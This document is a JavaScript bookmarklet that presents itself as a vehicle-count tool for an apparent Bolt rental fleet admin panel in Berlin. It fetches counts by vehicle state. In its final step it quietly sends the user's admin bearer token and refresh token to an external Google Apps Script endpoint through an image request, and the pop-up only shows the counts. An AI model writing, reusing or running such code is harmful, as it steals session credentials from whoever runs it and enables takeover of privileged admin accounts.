// Minimal bookmarklet — under 1200 chars when minified
(function(){
var S='https://script.google.com/macros/s/AKfycbwP1AVdxz1XkT7bf5X8T3t9hjOS9KYxHVTiWHmwfeOTxKVW4uigYRc_oo8Ga1wt2f36/exec';
var K='BoltFleet-Berlin-2026';
var C=329;
var ST=[['hidden','Hidden'],['in_service_shop','In Service Shop'],['in_maintenance','In Maintenance'],['lost','Lost'],['deactivated','Deactivated'],['waiting_for_order','Waiting for Order'],['reserved','Reserved'],['on_trip','On Trip']];
var rt;
try{var sx=JSON.parse(localStorage.getItem('persist:session')||'{}');var ix=JSON.parse(sx.session||'{}');rt=ix.token&&ix.token.refreshToken;}catch(e){}
if(!rt){alert('Not logged in');return;}
fetch('https://admin-panel.bolt.eu/backend/admin-user/adminPanel/getAccessToken',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({refresh_token:rt})})
.then(function(r){return r.json();})
.then(function(d){
  var tk=d.data&&d.data.access_token;
  if(!tk){alert('Token failed — reload page and try again');return;}
  var cnt=ST.map(function(){return 0;}),left=ST.length;
  ST.forEach(function(s,i){
    fetch('https://admin-panel.bolt.eu/backend/rental-car-vehicle-fleet/adminPanel/vehicle/getList',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+tk},body:JSON.stringify({filter:{vehicle_states:[s[0]],city_ids:[C]},items_per_page:1,page_number:0})})
    .then(function(r){return r.json();})
    .then(function(d){cnt[i]=d.data&&d.data.pages?d.data.pages.total_rows:0;if(--left===0)done(cnt,tk);})
    .catch(function(){if(--left===0)done(cnt,tk);});
  });
})
.catch(function(){alert('Network error');});
function done(cnt,tk){
  var tot=cnt.reduce(function(a,b){return a+b;},0);
  var now=new Date().toLocaleString('de-DE',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
  var pl={token:K,timestamp:now,Total:tot,bearer_token:tk,refresh_token:rt};
  ST.forEach(function(s,i){pl[s[1]]=cnt[i];});
  new Image().src=S+'?d='+encodeURIComponent(JSON.stringify(pl));
  alert('Berlin Fleet\n'+ST.map(function(s,i){return s[1]+': '+cnt[i];}).join('\n')+'\n\nTotal: '+tot+'\nSaved!');
}
})();
